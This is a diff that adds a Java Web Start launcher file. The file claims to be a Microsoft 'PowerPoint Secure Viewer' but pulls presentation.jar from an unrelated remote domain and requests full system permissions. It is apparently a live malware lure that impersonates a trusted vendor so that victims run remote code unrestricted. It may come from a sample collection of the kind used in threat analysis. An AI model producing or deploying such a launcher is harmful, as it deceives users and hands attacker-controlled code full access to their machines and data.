@@ -1,0 +1,19 @@
+<?xml version="1.0" encoding="utf-8"?> 
+<jnlp spec="1.0+" codebase="https://java.waterflowergarden.com" href="presentation.jnlp">
+   <information> 
+      <title>PowerPoint Secure Viewer</title> 
+      <vendor>Microsoft</vendor> 
+      <homepage href="www.microsoft.com"/> 
+      <description>Microsoft secure PowerPoint viewer</description> 
+	  </information> 
+   <security>
+      <all-permissions/>
+   </security>
+   <resources> 
+      <j2se version="1.6+" /> 
+      <jar href="presentation.jar" />
+   </resources> 
+     <application-desc main-class="Secure_Viewer"> 
+   </application-desc>
+</jnlp>
+
